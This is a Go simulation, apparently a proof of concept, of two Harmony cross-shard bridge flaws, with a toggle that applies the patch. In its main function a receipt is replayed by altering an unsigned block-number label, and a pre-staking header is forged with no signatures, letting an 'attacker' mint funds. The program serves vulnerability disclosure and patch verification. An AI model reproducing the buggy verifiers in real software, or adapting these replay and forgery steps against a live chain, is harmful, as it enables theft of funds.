package main

import (
	"crypto/sha256"
	"fmt"
)

// Flip this to true to apply Harmony's patch.
const FIXED = false

const PreStakingEpoch = 185 // epochs <= this use the "uniform" quorum verifier
const CXMerkleProofReplayFixEpoch = 2964

// ---------- data structures (same shape as real code) ----------

type Receipt struct {
	To     string
	Amount uint64
}

type Header struct {
	ShardID             uint32
	Number              uint64
	Epoch               uint64
	OutgoingReceiptHash [32]byte
}

func (h Header) Hash() [32]byte {
	return sha256.Sum256([]byte(fmt.Sprintf("%d|%d|%d|%x", h.ShardID, h.Number, h.Epoch, h.OutgoingReceiptHash)))
}

type CXMerkleProof struct { // NOT signed
	BlockNum      uint64 // extra label
	BlockHash     [32]byte
	ShardID       uint32 // extra label
	CXReceiptHash [32]byte
}

type CXReceiptsProof struct {
	Receipts     []Receipt
	MerkleProof  CXMerkleProof
	Header       Header
	CommitSig    [][32]byte // one "signature" per validator (stand-in for BLS)
	CommitBitmap []bool     // who signed
}

func receiptsHash(rs []Receipt) [32]byte {
	return sha256.Sum256([]byte(fmt.Sprintf("%v", rs)))
}

// ---------- validators ----------

var validatorKeys = []string{"v1-secret", "v2-secret", "v3-secret", "v4-secret"}

func sign(key string, h Header) [32]byte {
	hh := h.Hash()
	return sha256.Sum256(append([]byte(key), hh[:]...))
}

// Real code: consensus/quorum/verifier.go
func IsQuorumAchievedByMask(bitmap []bool) bool {
	threshold := len(validatorKeys)*2/3 + 1
	if FIXED {
		count := 0
		for _, signed := range bitmap {
			if signed {
				count++
			}
		}
		return count >= threshold
	}
	return len(validatorKeys) > threshold-1 // BUG: counts validators that EXIST
}

// Real code: internal/chain/engine.go verifySignature
func VerifyHeaderSignature(h Header, sigs [][32]byte, bitmap []bool) bool {
	if h.Epoch <= PreStakingEpoch && !IsQuorumAchievedByMask(bitmap) {
		return false
	}
	// only checks signatures of validators marked in the bitmap.
	// empty bitmap = nothing to check = passes (like the BLS identity point)
	for i, signed := range bitmap {
		if signed && (i >= len(sigs) || sigs[i] != sign(validatorKeys[i], h)) {
			return false
		}
	}
	return true
}

// ---------- destination shard ----------

var spentNotebook = map[string]bool{}
var balances = map[string]uint64{}

// Real code: core/block_validator.go ValidateCXReceiptsProof
func ValidateCXReceiptsProof(p CXReceiptsProof) bool {
	if receiptsHash(p.Receipts) != p.MerkleProof.CXReceiptHash {
		return false
	}
	if p.Header.Hash() != p.MerkleProof.BlockHash || p.Header.OutgoingReceiptHash != p.MerkleProof.CXReceiptHash {
		return false
	}
	if p.Header.Epoch >= CXMerkleProofReplayFixEpoch { // label check only for NEW headers
		if p.Header.Number != p.MerkleProof.BlockNum || p.Header.ShardID != p.MerkleProof.ShardID {
			return false
		}
	}
	return VerifyHeaderSignature(p.Header, p.CommitSig, p.CommitBitmap)
}

// Real code: core/blockchain_impl.go IsSpent / WriteCXReceiptsProofSpent
func spentKey(p CXReceiptsProof) string {
	shardID, blockNum := p.MerkleProof.ShardID, p.MerkleProof.BlockNum // start with unsigned label
	if FIXED || p.Header.Epoch >= CXMerkleProofReplayFixEpoch {
		shardID, blockNum = p.Header.ShardID, p.Header.Number // signed header
	}
	return fmt.Sprintf("shard %d, block %d", shardID, blockNum)
}

// Real code: core/state_processor.go ApplyIncomingReceipt
func SubmitProof(p CXReceiptsProof) {
	if !ValidateCXReceiptsProof(p) {
		fmt.Println("   REJECTED, invalid proof")
		return
	}
	key := spentKey(p)
	if spentNotebook[key] {
		fmt.Println("   REJECTED, already spent ->", key)
		return
	}
	for _, r := range p.Receipts {
		balances[r.To] += r.Amount // no debit anywhere
	}
	spentNotebook[key] = true
	fmt.Println("   ACCEPTED, notebook key ->", key)
}

// helper that builds a correctly hashed package
func buildProof(h Header, rs []Receipt, sigs [][32]byte, bitmap []bool) CXReceiptsProof {
	h.OutgoingReceiptHash = receiptsHash(rs)
	return CXReceiptsProof{
		Receipts:     rs,
		Header:       h,
		CommitSig:    sigs,
		CommitBitmap: bitmap,
		MerkleProof: CXMerkleProof{
			BlockNum: h.Number, ShardID: h.ShardID,
			BlockHash: h.Hash(), CXReceiptHash: h.OutgoingReceiptHash,
		},
	}
}

func main() {
	fmt.Println("FIXED =", FIXED)

	// ===== Attack 1, replay an old real receipt (bug 1) =====
	fmt.Println("\nAttack 1, replay")
	rs := []Receipt{{To: "attacker", Amount: 100}}
	h := Header{ShardID: 0, Number: 42, Epoch: 1000} // real transfer from 2024, before the fix epoch
	h.OutgoingReceiptHash = receiptsHash(rs)
	sigs := make([][32]byte, 4)
	bitmap := []bool{true, true, true, false} // 3 of 4 validators really signed
	for i := 0; i < 3; i++ {
		sigs[i] = sign(validatorKeys[i], h)
	}
	real := buildProof(h, rs, sigs, bitmap)

	fmt.Println("1) honest delivery")
	SubmitProof(real)

	for fake := uint64(9999); fake < 10003; fake++ {
		replay := real
		replay.MerkleProof.BlockNum = fake // only the unsigned label changes
		fmt.Printf("replay with label block %d\n", fake)
		SubmitProof(replay)
	}
	fmt.Println("attacker balance after attack 1 =", balances["attacker"])

	// ===== Attack 2, invent a fake old header with NO signatures (bug 2) =====
	fmt.Println("\nAttack 2, forged pre-staking header")
	fakeRs := []Receipt{{To: "attacker", Amount: 1_000_000_000_000}}
	fakeHeader := Header{ShardID: 0, Number: 777, Epoch: 100} // epoch 100 = pre-staking era
	forged := buildProof(fakeHeader, fakeRs, nil, []bool{false, false, false, false})
	SubmitProof(forged)

	fmt.Println("\nattacker final balance =", balances["attacker"])
}
